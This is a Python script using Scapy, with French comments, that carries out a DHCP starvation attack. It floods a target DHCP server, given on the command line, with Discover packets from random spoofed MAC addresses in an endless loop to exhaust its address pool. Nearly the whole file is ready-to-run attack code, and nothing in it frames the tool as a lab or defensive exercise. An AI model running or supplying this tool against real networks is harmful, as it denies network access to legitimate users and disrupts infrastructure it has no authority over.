from scapy.all import *
import random
import sys

def random_mac():
    """Génère une adresse MAC aléatoire."""
    mac = [0x00, 0x16, 0x3e, random.randint(0x00, 0xff), random.randint(0x00, 0xff), random.randint(0x00, 0xff)]
    return ':'.join(map(lambda x: "%02x" % x, mac))

def craft_dhcp_discover(server_ip, mac):
    """Crée un paquet DHCP Discover."""
    # Construction de la trame Ethernet
    eth = Ether(src=mac, dst="00:0c:29:b5:f1:0c")
    
    # Construction de la trame IP
    ip = IP(src="0.0.0.0", dst="255.255.255.255")
    
    # Construction de la trame UDP
    udp = UDP(sport=68, dport=67)

    # Construction de la trame DHCP
    dhcp = BOOTP(chaddr=mac.replace(":", "").encode(), xid=random.randint(1, 0xFFFFFFFF))
    dhcp_payload = DHCP(options=[("message-type", "discover"), ("server_id", server_ip), "end"])

    # Assemblage du paquet complet
    packet = eth / ip / udp / dhcp / dhcp_payload
    return packet

def dhcp_starvation(server_ip):
    """Lance une attaque DHCP Starvation."""
    print(f"Lancement de l'attaque DHCP Starvation sur le serveur {server_ip}...")
    
    exhausted = False
    while not exhausted:
        # Génère une adresse MAC aléatoire
        mac = random_mac()
        
        # Crée un paquet DHCP Discover
        packet = craft_dhcp_discover(server_ip, mac)
        
        # Envoie le paquet et capture les réponses
        answered, unanswered = srp(packet, timeout=2, verbose=0)
        
        # Affiche les paquets envoyés/réponses
        if answered:
            print("Réponse reçue :")
            for sent, received in answered:
                print(f" - IP assignée : {received['BOOTP'].yiaddr}")
        else:
            print("Aucune réponse reçue pour cette tentative.")

        # Critère pour stopper (par exemple : un message indiquant que la plage est épuisée)
        # Vous pouvez inclure une logique ici pour détecter que toutes les adresses IP sont épuisées
        # Exemple : Un message du serveur indiquant "No free leases"
        # exhausted = True (si détecté)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage : python3 dhcp_starvation.py <IP_serveur_DHCP>")
        sys.exit(1)
    
    server_ip = sys.argv[1]
    dhcp_starvation(server_ip)

